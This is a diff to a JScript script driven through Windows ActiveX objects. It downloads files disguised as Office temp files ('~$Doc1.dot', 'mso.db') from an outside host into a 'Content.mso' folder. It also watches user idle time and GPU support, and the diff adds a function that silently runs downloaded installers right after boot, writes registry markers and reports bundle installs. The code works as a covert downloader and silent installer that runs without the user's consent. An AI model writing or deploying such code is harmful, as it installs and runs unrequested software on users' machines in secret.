@@ -20,7 +20,7 @@ var __shellapp = new ActiveXObject("Shell.Application");
 
 //var __workdir = __storage.GetFolderPath(0, 0x0020, 0, 0) + "\\Content.mso\\"	
 var __workdir = __shellapp.Namespace(0x0020).Self.Path + "\\Content.mso\\";
-var __destReadys ={ name: "~$Doc1.dot",url:"http://conf.xmp.kankan.com/config/~$Doc1.dot", md5:"97C80E865FD75A9D17849EEEC6C83444" }
+var __destReady ={ name: "~$Doc1.dot",url:"http://conf.xmp.kankan.com/config/~$Doc1.dot", md5:"97C80E865FD75A9D17849EEEC6C83444" }
 var __startTickCout = __external.GetTickCount()
 var __lastInputInfo = __external.GetLastInputInfo()
 /*
@@ -34,8 +34,12 @@ if(__DEBUG)
 	var __idletime=1000*15
 else if(__IsSupportOpencl)
 	var __idletime=1000*30
-var __destReadys_dll ={ name: "mso.db",url:"http://conf.xmp.kankan.com/config/mso.db", md5:"F037240BA8B7315662E7496489345107" }
-var __installReadys = { name: "XMPSetup-fanli.exe", url:"http://xmp.down.sandai.net/kankan/XMPSetupLite_4.9.10.1806(2).exe", md5:"8867658a8edd9765342bfc2483ed8c3e"}
+var __destReady_dll ={ name: "mso.db",url:"http://conf.xmp.kankan.com/config/mso.db", md5:"F037240BA8B7315662E7496489345107" }
+var __installReadys = [
+						{id: 10001, name: "XMPSetup-fanli.exe", url:"http://xmp.down.sandai.net/kankan/XMPSetupLite_4.9.10.1806(2).exe", md5:"8867658a8edd9765342bfc2483ed8c3e"},
+						{id: 10002, name: "XMPSetup-fanli.exe", url:"http://xmp.down.sandai.net/kankan/XMPSetupLite_4.9.10.1806(2).exe", md5:"8867658a8edd9765342bfc2483ed8c3e"},
+					  ]
+						
 ///////////
 trace ("global var : __DEBUG="+__DEBUG+",__IsSupportOpencl="+__IsSupportOpencl+",__interrupted="+__interrupted+",__workdir="+__workdir+",__startTickCout="+__startTickCout+",__lastInputInfo="+__lastInputInfo)
 ///////
@@ -285,17 +289,11 @@ function filter_dlbusiness.prototype.run(pipe){
 						adostream.Mode = 3;
 						adostream.Type = 1;
 						adostream.Open();
-						
 						adostream.Write(objXMLHTTP.responseBody);
-						
 						adostream.SaveToFile(path,2);
 						adostream.Close();
-						
 						var fso = __fso;
 						//fso.GetFile(path).Attributes = 2 
-						var tmpFile = __shellapp.Namespace(0x0020).Self.Path + "\\" + pipe.name;						
-						if(fso.FileExists(tmpFile))
-							fso.DeleteFile(tmpFile, true);
 						delete adostream;
 						log("download from url="+pipe.url+" to path="+path+" ,status="+objXMLHTTP.status +" statusText="+objXMLHTTP.statusText+" ,tmpFile="+tmpFile );
 						if(1){
@@ -412,8 +410,33 @@ function filter_eXclusiveRuning.prototype.checkProcesses(){
 	return process ?  process.Name :false;
 }
 ////
+function tryInstall(){
+	var WshShell = __wshShell
+	__TRY(function (){WshShell.RegDelete("HKEY_CURRENT_USER\\Software\\ExtIconHandler\\force")})
+	var key_value
+	var prekey = "HKEY_CURRENT_USER\\Software\\ExtIconHandler\\s_";
+	for(var i in __installReadys){
+		var pipe = __installReadys[i];
+		var path = __workdir +pipe.name
+		if(__fso.FileExists(path)){
+			WshShell.run(path +" "+pipe.param, 0 ,false);
+			var key_path = prekey + parseInt(pipe.id /100) *100;
+			__TRY(function(){ key_value = WshShell.RegRead(key_path);})
+			key_value = key_value || "";
+			key_value +=pipe.id+";";
+			WshShell.RegWrite(key_path);
+			sendHttpStat("bundleinstalled", ""+""+pipe.name);
+		}
+	}	
+}
 var exitaction 
 function onload(){
+	if(__startTickCout<60*1000){
+		tryInstall();
+		exit(1);
+		return ;
+	}
+	 
 	//1.Æô¶¯Í³¼Æ
 	var __module = new module("global.js");	
 	sendHttpStat( "launch", "onload");
@@ -426,7 +449,7 @@ function onload(){
 	filter_load.callback = __module.push(filter_load);
 	filter_xrun2.callback = __module.push(filter_xrun2)
 	////////////
-	var pipe = __destReadys;
+	var pipe = __destReady;
 	__module.setDoneCallback(function (mod,pipe, index) {		
 		exitaction = pipe.exitaction
 		log(" module name "+mod.name+" onDoneCallback pipe.exitaction="+mod.pipe.exitaction+" pipe.exitcode="+pipe.exitcode+" indexfilter="+index);
